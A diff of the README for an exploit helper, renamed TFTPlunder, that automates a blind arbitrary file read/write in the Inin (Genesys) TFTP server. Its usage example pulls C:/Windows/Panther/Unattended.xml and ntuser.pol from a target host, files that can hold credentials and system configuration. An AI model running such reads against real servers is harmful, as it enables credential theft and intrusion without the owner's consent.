@@ -1,4 +1,4 @@
-Inin TFTP Server Arbitrary Directory Blind Read Write exploitation helper
+TFTPlunder: Inin TFTP Server Arbitrary Directory Blind Read Write exploitation helper
 
 This simple repo is for automating the process of exploiting a blind arbitrary file read/write that can be present in the inin (now genesys) tftp web server.
 
@@ -7,10 +7,10 @@ Just import the main python file, instantiate the class, and call get_file and p
 
 ```
 $ python3
->>> from file_downloader import FileDownloader
->>> fd=FileDownloader("example.com")
->>> fd.get_file("C:/Windows/Panther/Unattended.xml")
->>> fd.get_file("C:/ProgramData/ntuser.pol")
+>>> from tftplunder import TFTPlunder
+>>> tp=TFTPlunder("example.com")
+>>> tp.get_file("C:/Windows/Panther/Unattended.xml")
+>>> tp.get_file("C:/ProgramData/ntuser.pol")
 
 ```
 
